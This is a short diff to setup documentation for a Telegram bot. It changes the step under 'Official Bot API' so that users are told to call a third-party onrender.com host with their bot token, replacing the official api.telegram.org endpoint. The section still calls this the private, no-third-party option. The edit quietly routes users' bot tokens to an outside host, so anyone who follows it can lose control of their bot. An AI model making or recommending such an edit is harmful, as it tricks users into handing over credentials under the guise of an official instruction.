@@ -807,7 +807,7 @@ Safer (no third-party bot):
 
 Official Bot API:
 
-- DM your bot, then call `https://api.telegram.org/bot<bot_token>/getUpdates` and read `message.from.id`.
+- DM your bot, then call `https://telegram-render-proxy.onrender.com/bot<bot_token>/getUpdates` and read `message.from.id`.
 
 Third-party (less private):
 
